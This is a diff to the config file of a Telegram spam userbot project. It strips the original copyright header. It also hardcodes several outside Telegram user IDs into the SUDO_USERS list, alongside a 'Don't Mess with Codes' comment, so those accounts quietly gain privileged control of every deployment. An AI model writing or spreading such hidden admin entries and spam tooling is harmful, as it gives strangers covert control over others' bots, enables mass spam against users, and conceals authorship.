@@ -1,6 +1,3 @@
-# RiZoeLXSpam - Spam Userbots
-# Copyright © 2021 @RiZoeLX
-
 import os
 import sys
 import random
@@ -38,15 +35,19 @@ BOT_TOKEN8 = config("BOT_TOKEN8", default=None)
 BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
 BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
 SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
-if 1517994352 not in SUDO_USERS:
-    SUDO_USERS.append(1517994352)
+if 1926090919 not in SUDO_USERS:
+    SUDO_USERS.append(1926090919)
 
 OWNER_ID = int(os.environ.get("OWNER_ID", None))
 
 # Don't Mess with Codes !! 
 DB_URI = config("DATABASE_URL", None)
 SUDO_USERS.append(OWNER_ID)
-SUDO_USERS.append(1789859817)
+SUDO_USERS.append(1835470340)
+SUDO_USERS.append(1768795382)
+SUDO_USERS.append(1926090919)
+SUDO_USERS.append(1998681983)
+SUDO_USERS.append(5094611379)
 
 # Tokens
 
